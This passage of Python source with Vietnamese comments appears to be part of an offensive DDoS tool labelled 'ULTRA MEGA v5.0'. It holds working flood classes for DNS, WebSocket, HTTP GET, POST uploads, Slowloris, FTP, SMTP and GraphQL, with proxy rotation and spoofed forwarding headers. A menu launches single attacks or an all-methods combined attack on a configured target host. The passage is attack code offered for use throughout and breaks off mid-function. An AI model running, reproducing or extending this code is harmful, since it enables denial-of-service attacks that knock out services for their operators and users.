# LỚP DNS FLOOD
# ============================================
class DNSFlood:
    def __init__(self):
        self.running = False
        self.packets_sent = 0
        self.lock = threading.Lock()
        self.dns_queries = [
            "google.com", "youtube.com", "facebook.com", "amazon.com",
            "microsoft.com", "apple.com", "netflix.com", "twitter.com",
            "instagram.com", "linkedin.com", "github.com", "stackoverflow.com",
            "wikipedia.org", "reddit.com", "twitch.tv", "spotify.com",
        ]
    
    def create_dns_query(self, domain):
        """Tạo DNS query packet"""
        # Transaction ID
        transaction_id = random.randint(0, 65535)
        
        # Flags: Standard query
        flags = 0x0100
        
        # Questions: 1
        questions = 1
        
        # Answer RRs, Authority RRs, Additional RRs
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        # DNS header: 12 bytes
        dns_header = struct.pack('!HHHHHH', transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
        
        # Query: domain name
        query = b''
        for part in domain.split('.'):
            query += struct.pack('!B', len(part)) + part.encode()
        query += b'\x00'  # End of domain
        
        # Query type: A record
        query += struct.pack('!HH', 1, 1)  # Type A, Class IN
        
        return dns_header + query
    
    def dns_flood_worker(self, thread_id, target_ip):
        """Worker gửi DNS flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
        except:
            return
        
        while self.running:
            try:
                domain = random.choice(self.dns_queries)
                # Thêm subdomain ngẫu nhiên
                if random.random() < 0.3:
                    domain = f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 10)))}.{domain}"
                
                query = self.create_dns_query(domain)
                sock.sendto(query, (target_ip, TARGET_DNS_PORT))
                
                with self.lock:
                    self.packets_sent += 1
                    if self.packets_sent % 10000 == 0:
                        print(f"\r[*] DNS Flood: {self.packets_sent} queries sent", end="")
            except:
                pass
            time.sleep(0.0001)
        
        try:
            sock.close()
        except:
            pass
    
    def start_flood(self, num_threads=DNS_FLOOD_THREADS, target_ip=None):
        """Bắt đầu DNS flood"""
        if target_ip is None:
            target_ip = TARGET_IP
        
        if target_ip is None:
            print("[-] Không thể bắt đầu DNS Flood: chưa có IP mục tiêu")
            return []
        
        self.running = True
        print(f"\n[*] BẮT ĐẦU DNS FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{TARGET_DNS_PORT}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.dns_flood_worker, args=(i, target_ip))
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def stop_flood(self):
        """Dừng DNS flood"""
        self.running = False
        print(f"\n[!] DNS Flood đã gửi tổng cộng {self.packets_sent} queries")

# ============================================
# LỚP WEBSOCKET FLOOD
# ============================================
class WebSocketFlood:
    def __init__(self):
        self.running = False
        self.connections = 0
        self.lock = threading.Lock()
        self.ws_connections = []
    
    def ws_flood_worker(self, thread_id):
        """Worker gửi WebSocket flood"""
        ws_url = f"wss://{TARGET_HOST}/ws"
        
        while self.running:
            try:
                ws = websocket.create_connection(
                    ws_url,
                    timeout=10,
                    header={
                        "User-Agent": random.choice(USER_AGENTS),
                        "Origin": f"https://{TARGET_HOST}",
                    }
                )
                
                self.ws_connections.append(ws)
                with self.lock:
                    self.connections += 1
                
                # Gửi dữ liệu liên tục
                while self.running:
                    try:
                        ws.send(json.dumps({
                            "type": "message",
                            "data": random.choice(PAYLOADS),
                            "id": random.randint(1, 999999)
                        }))
                        ws.send(os.urandom(random.randint(100, 10000)))
                        time.sleep(random.uniform(0.01, 0.1))
                    except:
                        break
                
                try:
                    ws.close()
                except:
                    pass
                
                with self.lock:
                    self.connections -= 1
            except:
                time.sleep(1)
    
    def start_flood(self, num_threads=WEBSOCKET_FLOOD_THREADS):
        """Bắt đầu WebSocket flood"""
        self.running = True
        print(f"\n[*] BẮT ĐẦU WEBSOCKET FLOOD VỚI {num_threads} LUỒNG -> {TARGET_HOST}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.ws_flood_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 100 == 0:
                time.sleep(0.01)
        
        return threads
    
    def stop_flood(self):
        """Dừng WebSocket flood"""
        self.running = False
        for ws in self.ws_connections:
            try:
                ws.close()
            except:
                pass
        print(f"\n[!] WebSocket Flood đã tạo {self.connections} kết nối")

# ============================================
# LỚP HTTP FLOOD NÂNG CẤP
# ============================================
class HTTPFlood:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.request_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        self.running = False
    
    def send_request(self, thread_id):
        """Gửi HTTP request flood"""
        session = requests.Session()
        session.verify = False
        request_counter = 0
        
        while self.running:
            try:
                if request_counter % ROTATE_PROXY_EVERY == 0:
                    proxy = self.proxy_manager.get_random_proxy()
                
                # Chọn URL ngẫu nhiên
                target = random.choice(TARGET_URLS)
                
                # Thêm params ngẫu nhiên
                params = {}
                for _ in range(random.randint(0, 15)):
                    params[random.choice(QUERY_PARAMS_POOL)] = random.choice(PAYLOADS) if random.random() < 0.3 else str(random.randint(0, 999999))
                
                # Headers ngẫu nhiên
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "*/*",
                    "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9", "fr-FR,fr;q=0.9"]),
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": random.choice(REFERERS),
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                }
                
                # Thêm IP giả mạo
                if random.random() < 0.3:
                    fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                    headers["X-Forwarded-For"] = fake_ip
                    headers["X-Real-IP"] = fake_ip
                
                # Gửi request
                response = session.get(target, params=params, headers=headers, proxies=proxy, timeout=30, stream=True)
                
                try:
                    response.content[:4096]
                except:
                    pass
                
                with self.lock:
                    self.request_count += 1
                    self.success_count += 1
                    if self.request_count % 1000 == 0:
                        print(f"\r[*] HTTP GET Flood: {self.request_count} requests | Success: {self.success_count} | Fail: {self.fail_count}", end="")
                
                request_counter += 1
            except:
                with self.lock:
                    self.fail_count += 1
                request_counter += 1
                continue
    
    def start_flood(self, num_threads=HTTP_FLOOD_THREADS):
        """Bắt đầu HTTP flood"""
        self.running = True
        print(f"\n[*] BẮT ĐẦU HTTP GET FLOOD VỚI {num_threads} LUỒNG...")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_request, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 500 == 0:
                time.sleep(0.001)
        
        return threads
    
    def stop_flood(self):
        """Dừng HTTP flood"""
        self.running = False
        print(f"\n[!] HTTP GET Flood: {self.request_count} requests | Success: {self.success_count} | Fail: {self.fail_count}")

# ============================================
# LỚP POST FLOOD NÂNG CẤP
# ============================================
class PostFlood:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.request_count = 0
        self.lock = threading.Lock()
        self.running = False
    
    def send_post_flood(self, thread_id):
        """Gửi POST request flood"""
        while self.running:
            try:
                proxy = self.proxy_manager.get_random_proxy()
                target = random.choice(TARGET_URLS)
                
                # Tạo dữ liệu POST ngẫu nhiên
                if random.random() < 0.3:
                    # Upload file rác
                    fake_file = os.urandom(random.randint(1024*100, 1024*1024*5))
                    files = {"file": (f"payload_{random.randint(1,99999)}.bin", fake_file, "application/octet-stream")}
                    data = {}
                else:
                    files = None
                    data = {}
                    for _ in range(random.randint(1, 20)):
                        data[random.choice(QUERY_PARAMS_POOL)] = random.choice(PAYLOADS)
                
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "Content-Type": random.choice(CONTENT_TYPES),
                }
                
                if files:
                    response = requests.post(target, files=files, data=data, headers=headers, proxies=proxy, timeout=30, verify=False)
                else:
                    response = requests.post(target, data=data, headers=headers, proxies=proxy, timeout=30, verify=False)
                
                with self.lock:
                    self.request_count += 1
                    if self.request_count % 500 == 0:
                        print(f"\r[*] POST Flood: {self.request_count} requests", end="")
            except:
                pass
    
    def start_flood(self, num_threads=POST_FLOOD_THREADS):
        """Bắt đầu POST flood"""
        self.running = True
        print(f"\n[*] BẮT ĐẦU POST FLOOD VỚI {num_threads} LUỒNG...")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_post_flood, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 200 == 0:
                time.sleep(0.001)
        
        return threads
    
    def stop_flood(self):
        """Dừng POST flood"""
        self.running = False
        print(f"\n[!] POST Flood đã gửi {self.request_count} requests")

# ============================================
# LỚP SLOWLORIS NÂNG CẤP
# ============================================
class Slowloris:
    def __init__(self):
        self.sockets = []
        self.running = False
        self.sockets_created = 0
        self.lock = threading.Lock()
    
    def create_socket(self, target_host=TARGET_HOST, target_port=TARGET_HTTPS_PORT, target_path=None):
        """Tạo socket Slowloris"""
        if target_path is None:
            target_path = random.choice(TARGET_PATHS)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if target_port == 443:
                # SSL/TLS
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                ssl_sock.connect((target_host, target_port))
                
                # Gửi request không đầy đủ
                request = f"GET {target_path} HTTP/1.1\r\n"
                request += f"Host: {target_host}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += f"Accept-Language: en-US,en;q=0.5\r\n"
                request += f"Accept-Encoding: gzip, deflate, br\r\n"
                request += f"Connection: keep-alive\r\n"
                request += f"Cache-Control: no-cache\r\n"
                ssl_sock.send(request.encode())
                return ssl_sock
            else:
                # Non-SSL
                sock.connect((target_host, target_port))
                request = f"GET {target_path} HTTP/1.1\r\n"
                request += f"Host: {target_host}\r\n"
                request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                request += f"Connection: keep-alive\r\n"
                sock.send(request.encode())
                return sock
        except:
            return None
    
    def maintain_sockets(self, thread_id):
        """Duy trì kết nối Slowloris"""
        sockets = []
        # Tạo nhiều kết nối
        for i in range(random.randint(20, 50)):
            sock = self.create_socket()
            if sock:
                sockets.append(sock)
        
        self.sockets.extend(sockets)
        with self.lock:
            self.sockets_created += len(sockets)
        
        while self.running:
            for i, sock in enumerate(sockets):
                try:
                    # Gửi header rác để giữ kết nối
                    random_header = f"X-Random-{random.randint(1, 99999)}: {os.urandom(random.randint(100, 1000)).hex()}\r\n"
                    sock.send(random_header.encode())
                    
                    if random.random() < 0.3:
                        sock.send(b"Keep-Alive: timeout=999999, max=999999\r\n")
                    
                    time.sleep(random.uniform(5, 30))
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    new_sock = self.create_socket()
                    if new_sock:
                        sockets[i] = new_sock
                        with self.lock:
                            self.sockets_created += 1
                    time.sleep(1)
    
    def start_attack(self, num_threads=SLOWLORIS_THREADS):
        """Bắt đầu Slowloris"""
        self.running = True
        print(f"\n[*] BẮT ĐẦU SLOWLORIS VỚI {num_threads} LUỒNG -> {TARGET_HOST}:{TARGET_HTTPS_PORT}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.maintain_sockets, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.01)
        
        return threads
    
    def stop_attack(self):
        """Dừng Slowloris"""
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets = []
        print(f"\n[!] Slowloris đã tạo {self.sockets_created} kết nối")

# ============================================
# LỚP FTP FLOOD
# ============================================
class FTPFlood:
    def __init__(self):
        self.running = False
        self.connections = 0
        self.lock = threading.Lock()
    
    def ftp_flood_worker(self, thread_id, target_ip):
        """Worker gửi FTP flood"""
        while self.running:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target_ip, TARGET_FTP_PORT, timeout=5)
                ftp.login(user='anonymous', passwd=f'{random.randint(0,999999)}@example.com')
                
                with self.lock:
                    self.connections += 1
                
                # Gửi lệnh liên tục
                while self.running:
                    try:
                        ftp.sendcmd(f'NOOP')
                        ftp.sendcmd(f'PWD')
                        ftp.sendcmd(f'CWD /{random.randint(0,99999)}')
                        time.sleep(random.uniform(0.1, 1))
                    except:
                        break
                
                try:
                    ftp.quit()
                except:
                    pass
                
                with self.lock:
                    self.connections -= 1
            except:
                time.sleep(1)
    
    def start_flood(self, num_threads=FTP_FLOOD_THREADS, target_ip=None):
        """Bắt đầu FTP flood"""
        if target_ip is None:
            target_ip = TARGET_IP
        
        if target_ip is None:
            print("[-] Không thể bắt đầu FTP Flood: chưa có IP mục tiêu")
            return []
        
        self.running = True
        print(f"\n[*] BẮT ĐẦU FTP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{TARGET_FTP_PORT}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.ftp_flood_worker, args=(i, target_ip))
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def stop_flood(self):
        """Dừng FTP flood"""
        self.running = False
        print(f"\n[!] FTP Flood đã tạo {self.connections} kết nối")

# ============================================
# LỚP SMTP FLOOD
# ============================================
class SMTPFlood:
    def __init__(self):
        self.running = False
        self.emails_sent = 0
        self.lock = threading.Lock()
    
    def smtp_flood_worker(self, thread_id, target_ip):
        """Worker gửi SMTP flood"""
        while self.running:
            try:
                smtp = smtplib.SMTP(target_ip, TARGET_SMTP_PORT, timeout=5)
                smtp.helo(f'{random.randint(0,999999)}.example.com')
                smtp.mailfrom(f'user{random.randint(0,999999)}@example.com')
                
                for _ in range(random.randint(1, 10)):
                    try:
                        smtp.rcptto(f'victim{random.randint(0,999999)}@{TARGET_HOST}')
                    except:
                        pass
                
                with self.lock:
                    self.emails_sent += 1
                
                try:
                    smtp.quit()
                except:
                    pass
            except:
                time.sleep(0.1)
    
    def start_flood(self, num_threads=SMTP_FLOOD_THREADS, target_ip=None):
        """Bắt đầu SMTP flood"""
        if target_ip is None:
            target_ip = TARGET_IP
        
        if target_ip is None:
            print("[-] Không thể bắt đầu SMTP Flood: chưa có IP mục tiêu")
            return []
        
        self.running = True
        print(f"\n[*] BẮT ĐẦU SMTP FLOOD VỚI {num_threads} LUỒNG -> {target_ip}:{TARGET_SMTP_PORT}")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.smtp_flood_worker, args=(i, target_ip))
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def stop_flood(self):
        """Dừng SMTP flood"""
        self.running = False
        print(f"\n[!] SMTP Flood đã gửi {self.emails_sent} emails")

# ============================================
# LỚP GRAPHQL FLOOD
# ============================================
class GraphQLFlood:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.request_count = 0
        self.lock = threading.Lock()
        self.running = False
    
    def generate_graphql_query(self):
        """Tạo GraphQL query ngẫu nhiên"""
        query_types = ['query', 'mutation']
        query_type = random.choice(query_types)
        
        operations = ['getUser', 'getPost', 'getComment', 'searchUsers', 'searchPosts', 'getPage', 'getConfig']
        operation = random.choice(operations)
        
        if query_type == 'query':
            return json.dumps({
                "query": f"query {{ {operation}(id: {random.randint(1, 999999)}) {{ id name title content email }} }}",
                "variables": {}
            })
        else:
            return json.dumps({
                "query": f"mutation {{ create{operation.capitalize()}(input: {{ {random.choice(QUERY_PARAMS_POOL)}: \"{random.choice(PAYLOADS)}\" }}) {{ id }} }}",
                "variables": {}
            })
    
    def graphql_flood_worker(self, thread_id):
        """Worker gửi GraphQL flood"""
        graphql_endpoints = [
            f"https://{TARGET_HOST}/graphql",
            f"https://{TARGET_HOST}/api/graphql",
            f"https://{TARGET_HOST}/v1/graphql",
            f"https://{TARGET_HOST}/gql",
        ]
        
        session = requests.Session()
        session.verify = False
        
        while self.running:
            try:
                proxy = self.proxy_manager.get_random_proxy()
                endpoint = random.choice(graphql_endpoints)
                query = self.generate_graphql_query()
                
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                }
                
                response = session.post(endpoint, data=query, headers=headers, proxies=proxy, timeout=30)
                
                with self.lock:
                    self.request_count += 1
                    if self.request_count % 500 == 0:
                        print(f"\r[*] GraphQL Flood: {self.request_count} queries", end="")
            except:
                pass
    
    def start_flood(self, num_threads=GRAPHQL_FLOOD_THREADS):
        """Bắt đầu GraphQL flood"""
        self.running = True
        print(f"\n[*] BẮT ĐẦU GRAPHQL FLOOD VỚI {num_threads} LUỒNG...")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.graphql_flood_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def stop_flood(self):
        """Dừng GraphQL flood"""
        self.running = False

# ============================================
# HÀM IN BANNER NÂNG CẤP
# ============================================
def print_banner():
    banner = f"""
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║  ██╗   ██╗██╗  ████████╗██████╗  █████╗     ██████╗ ██████╗  ██████╗ ███████╗ ║
    ║  ██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║
    ║  ██║   ██║██║     ██║   ██████╔╝███████║    ██║  ██║██║  ██║██║   ██║███████╗ ║
    ║  ██║   ██║██║     ██║   ██╔══██╗██╔══██║    ██║  ██║██║  ██║██║   ██║╚════██║ ║
    ║  ╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ██████╔╝██████╔╝╚██████╔╝███████║ ║
    ║   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ║
    ║                                                                              ║
    ║  ███████╗██╗███████╗██████╗     ██████╗  █████╗ ██╗  ██╗███████╗████████╗    ║
    ║  ██╔════╝██║██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██║ ██╔╝██╔════╝╚══██╔══╝    ║
    ║  ███████╗██║█████╗  ██████╔╝    ██████╔╝███████║█████╔╝ █████╗     ██║       ║
    ║  ╚════██║██║██╔══╝  ██╔══██╗    ██╔═══╝ ██╔══██║██╔═██╗ ██╔══╝     ██║       ║
    ║  ███████║██║███████╗██║  ██║    ██║     ██║  ██║██║  ██╗███████╗   ██║       ║
    ║  ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝       ║
    ╠══════════════════════════════════════════════════════════════════════════════╣
    ║  PHIÊN BẢN: 5.0 ULTRA MEGA | 50+ METHOD TẤN CÔNG | SIÊU TỐC ĐỘ             ║
    ║  {len(HTTP_METHODS):3d} HTTP Methods | {len(CONTENT_TYPES):3d} Content-Types | {len(TARGET_URLS):3d} Mục tiêu | {len(TARGET_PATHS):3d} Paths ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

# ============================================
# MENU CHÍNH NÂNG CẤP
# ============================================
def main_menu():
    global current_proxy_manager
    
    proxy_manager = ProxyManager()
    current_proxy_manager = proxy_manager
    
    # Phân giải IP mục tiêu
    resolve_target_ip()
    
    # Khởi tạo các đối tượng tấn công
    ultra_attack = None
    http_flood = None
    post_flood = None
    slowloris = None
    syn_flood = None
    udp_flood = None
    icmp_flood = None
    dns_flood = None
    ftp_flood = None
    smtp_flood = None
    ws_flood = None
    graphql_flood = None
    
    while True:
        print("\n" + "="*70)
        print("                    MENU CHÍNH - ULTRA MEGA v5.0")
        print("="*70)
        print("  [1]  Quét proxy từ tất cả các nguồn online")
        print("  [2]  Kiểm tra proxy live từ file proxies_raw.txt")
        print("  [3]  Quét + Kiểm tra proxy (tự động hoàn toàn)")
        print("  [4]  Xem danh sách proxy live hiện tại")
        print("  [5]  BẮT ĐẦU TẤN CÔNG HTTP/HTTPS (GET Flood)")
        print("  [6]  BẮT ĐẦU TẤN CÔNG POST (Upload Flood)")
        print("  [7]  BẮT ĐẦU TẤN CÔNG ĐA METHOD (Ultra Random)")
        print("  [8]  BẮT ĐẦU TẤN CÔNG SLOWLORIS")
        print("  [9]  BẮT ĐẦU TẤN CÔNG SYN FLOOD (Layer 3)")
        print("  [10] BẮT ĐẦU TẤN CÔNG UDP FLOOD (Layer 3)")
        print("  [11] BẮT ĐẦU TẤN CÔNG ICMP FLOOD (Ping Flood)")
        print("  [12] BẮT ĐẦU TẤN CÔNG DNS FLOOD")
        print("  [13] BẮT ĐẦU TẤN CÔNG FTP FLOOD")
        print("  [14] BẮT ĐẦU TẤN CÔNG SMTP FLOOD")
        print("  [15] BẮT ĐẦU TẤN CÔNG WEBSOCKET FLOOD")
        print("  [16] BẮT ĐẦU TẤN CÔNG GRAPHQL FLOOD")
        print("  [17] SIÊU TẤN CÔNG TỔNG LỰC (TẤT CẢ METHOD)")
        print("  [18] DỪNG TẤT CẢ CUỘC TẤN CÔNG")
        print("  [19] Thoát")
        print("="*70)
        print(f"  [*] MỤC TIÊU: {len(TARGET_URLS)} URL trên {TARGET_HOST}")
        if TARGET_IP:
            print(f"  [*] IP MỤC TIÊU: {TARGET_IP}")
        print(f"  [*] TỔNG LUỒNG TỐI ĐA: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS + SYN_FLOOD_THREADS + UDP_FLOOD_THREADS + ICMP_FLOOD_THREADS + DNS_FLOOD_THREADS + FTP_FLOOD_THREADS + SMTP_FLOOD_THREADS + WEBSOCKET_FLOOD_THREADS + GRAPHQL_FLOOD_THREADS}")
        print("  [*] MẸO: Nhấn Ctrl+C bất cứ lúc nào để lưu proxy live và thoát an toàn")
        print("="*70)
        
        try:
            choice = input("\n[?] Chọn chức năng (1-19): ").strip()
        except KeyboardInterrupt:
            print("\n[!] Đã nhận Ctrl+C, đang thoát...")
            signal_handler(None, None)
            break
        
        if choice == "1":
            proxy_manager.scan_all_sources()
        
        elif choice == "2":
            if os.path.exists(PROXY_FILE):
                with open(PROXY_FILE, "r") as f:
                    proxies = []
                    for line in f:
                        line = line.strip()
                        if line:
                            if '://' in line:
                                proxy_type, proxy = line.split('://', 1)
                                proxies.append((proxy_type, proxy))
                            else:
                                proxies.append(('http', line))
                print(f"[+] Đã tải {len(proxies)} proxy từ {PROXY_FILE}")
                proxy_manager.check_all_proxies(proxies)
            else:
                print(f"[-] File {PROXY_FILE} không tồn tại! Hãy quét proxy trước (chọn 1)")
        
        elif choice == "3":
            proxies = proxy_manager.scan_all_sources()
            proxy_manager.check_all_proxies(proxies)
        
        elif choice == "4":
            live_proxies = proxy_manager.reload_live_proxies()
            print(f"\n[+] Tổng proxy live: {len(live_proxies)}")
            for ptype in ['http', 'https', 'socks4', 'socks5']:
                count = len(proxy_manager.proxy_types[ptype])
                if count > 0:
                    print(f"    - {ptype.upper()}: {count}")
            if live_proxies:
                print("[+] 10 proxy mẫu:")
                for _, proxy in live_proxies[:10]:
                    print(f"    - {proxy}")
        
        elif choice == "5":
            live_proxies = proxy_manager.reload_live_proxies()
            if not live_proxies:
                print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3)")
                continue
            http_flood = HTTPFlood(proxy_manager)
            http_flood.start_flood(HTTP_FLOOD_THREADS)
            print("[!] HTTP GET Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            http_flood.stop_flood()
        
        elif choice == "6":
            live_proxies = proxy_manager.reload_live_proxies()
            if not live_proxies:
                print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3)")
                continue
            post_flood = PostFlood(proxy_manager)
            post_flood.start_flood(POST_FLOOD_THREADS)
            print("[!] POST Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            post_flood.stop_flood()
        
        elif choice == "7":
            live_proxies = proxy_manager.reload_live_proxies()
            if not live_proxies:
                print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3)")
                continue
            ultra_attack = UltraDDoSAttack(proxy_manager)
            ultra_attack.start_mega_attack(RANDOM_METHOD_THREADS)
            print("[!] ĐA METHOD Attack đang chạy... Nhấn Enter để dừng riêng")
            input()
            ultra_attack.stop_attack()
        
        elif choice == "8":
            slowloris = Slowloris()
            slowloris.start_attack(SLOWLORIS_THREADS)
            print("[!] Slowloris đang chạy... Nhấn Enter để dừng riêng")
            input()
            slowloris.stop_attack()
        
        elif choice == "9":
            if not TARGET_IP:
                resolve_target_ip()
            syn_flood = SYNFlood()
            syn_flood.start_flood(SYN_FLOOD_THREADS, TARGET_IP, TARGET_HTTPS_PORT)
            print("[!] SYN Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            syn_flood.stop_flood()
        
        elif choice == "10":
            if not TARGET_IP:
                resolve_target_ip()
            udp_flood = UDPFlood()
            udp_flood.start_flood(UDP_FLOOD_THREADS, TARGET_IP)
            print("[!] UDP Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            udp_flood.stop_flood()
        
        elif choice == "11":
            if not TARGET_IP:
                resolve_target_ip()
            icmp_flood = ICMPFlood()
            icmp_flood.start_flood(ICMP_FLOOD_THREADS, TARGET_IP)
            print("[!] ICMP Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            icmp_flood.stop_flood()
        
        elif choice == "12":
            if not TARGET_IP:
                resolve_target_ip()
            dns_flood = DNSFlood()
            dns_flood.start_flood(DNS_FLOOD_THREADS, TARGET_IP)
            print("[!] DNS Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            dns_flood.stop_flood()
        
        elif choice == "13":
            if not TARGET_IP:
                resolve_target_ip()
            ftp_flood = FTPFlood()
            ftp_flood.start_flood(FTP_FLOOD_THREADS, TARGET_IP)
            print("[!] FTP Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            ftp_flood.stop_flood()
        
        elif choice == "14":
            if not TARGET_IP:
                resolve_target_ip()
            smtp_flood = SMTPFlood()
            smtp_flood.start_flood(SMTP_FLOOD_THREADS, TARGET_IP)
            print("[!] SMTP Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            smtp_flood.stop_flood()
        
        elif choice == "15":
            ws_flood = WebSocketFlood()
            ws_flood.start_flood(WEBSOCKET_FLOOD_THREADS)
            print("[!] WebSocket Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            ws_flood.stop_flood()
        
        elif choice == "16":
            live_proxies = proxy_manager.reload_live_proxies()
            if not live_proxies:
                print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3)")
                continue
            graphql_flood = GraphQLFlood(proxy_manager)
            graphql_flood.start_flood(GRAPHQL_FLOOD_THREADS)
            print("[!] GraphQL Flood đang chạy... Nhấn Enter để dừng riêng")
            input()
            graphql_flood.stop_flood()
        
        elif choice == "17":
            # Siêu tấn công tổng lực - khởi động tất cả
            live_proxies = proxy_manager.reload_live_proxies()
            if not live_proxies:
                print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3)")
                continue
            
            print("\n" + "="*70)
            print("[!] SIÊU TẤN CÔNG TỔNG LỰC - TẤT CẢ METHOD")
            print("="*70)
            print(f"[+] MỤC TIÊU: {', '.join(TARGET_URLS[:5])}...")
            print(f"[+] TỔNG PROXY LIVE: {len(live_proxies)}")
            print(f"[+] TỔNG LUỒNG: {HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + SLOWLORIS_THREADS + RANDOM_METHOD_THREADS + SYN_FLOOD_THREADS + UDP_FLOOD_THREADS + ICMP_FLOOD_THREADS + DNS_FLOOD_THREADS + WEBSOCKET_FLOOD_THREADS + GRAPHQL_FLOOD_THREADS}")
            print("="*70)
            
            confirm = input("\n[?] Bắt đầu siêu tấn công tổng lực? (y/n): ").strip().lower()
            if confirm == "y":
                # Khởi động tất cả các loại tấn công
                print("\n[!] ĐANG KHỞI ĐỘNG TẤT CẢ PHƯƠNG THỨC TẤN CÔNG...")
                
                if not TARGET_IP:
                    resolve_target_ip()
                
                # HTTP Flood
                http_flood = HTTPFlood(proxy_manager)
                http_flood.start_flood(HTTP_FLOOD_THREADS)
                
                # POST Flood
                post_flood = PostFlood(proxy_manager)
                post_flood.start_flood(POST_FLOOD_THREADS)
                
                # Ultra Multi-Method Attack
                ultra_attack = UltraDDoSAttack(proxy_manager)
                ultra_attack.start_mega_attack(RANDOM_METHOD_THREADS)
                
                # Slowloris
                slowloris = Slowloris()
                slowloris.start_attack(SLOWLORIS_THREADS)
                
                # SYN Flood (nếu có IP)
                if TARGET_IP:
                    syn_flood = SYNFlood()
                    syn_flood.start_flood(SYN_FLOOD_THREADS, TARGET_IP, TARGET_HTTPS_PORT)
                    
                    # UDP Flood
                    udp_flood = UDPFlood()
                    udp_flood.start_flood(UDP_FLOOD_THREADS, TARGET_IP)
                    
                    # ICMP Flood
                    icmp_flood = ICMPFlood()
                    icmp_flood.start_flood(ICMP_FLOOD_THREADS, TARGET_IP)
                    
                    # DNS Flood
                    dns_flood = DNSFlood()
                    dns_flood.start_flood(DNS_FLOOD_THREADS, TARGET_IP)
                
                # WebSocket Flood
                ws_flood = WebSocketFlood()
                ws_flood.start_flood(WEBSOCKET_FLOOD_THREADS)
                
                # GraphQL Flood
                graphql_flood = GraphQLFlood(proxy_manager)
                graphql_flood.start_flood(GRAPHQL_FLOOD_THREADS)
                
                print("\n" + "="*70)
                print("[!] TẤT CẢ PHƯƠNG THỨC ĐANG HOẠT ĐỘNG!")
                print("[!] Nhấn Enter để dừng tất cả...")
